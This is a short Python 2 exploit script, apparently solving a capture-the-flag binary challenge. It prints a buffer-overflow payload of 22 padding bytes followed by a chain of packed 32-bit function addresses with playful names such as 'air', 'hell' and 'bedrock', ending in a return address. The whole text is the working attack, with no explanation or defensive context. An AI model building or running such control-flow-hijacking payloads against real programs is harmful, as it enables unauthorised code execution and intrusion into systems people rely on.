import struct

air = 0x8049216 #a
water = 0x804926d #b
land = 0x80492c4 #c
underground = 0x804931b #d
limbo  = 0x8049372 #e
hell = 0x80493c9 #f
minecraft_nether = 0x8049420 #g
bedrock = 0x8049477 #h
ret = 0x08049569

print "A" * 22 + struct.pack("I", air) +struct.pack("I", water) + struct.pack("I", land) + struct.pack("I", underground) + struct.pack("I", limbo) + struct.pack("I", hell) + struct.pack("I", minecraft_nether) + struct.pack("I", bedrock) + struct.pack("I", ret)
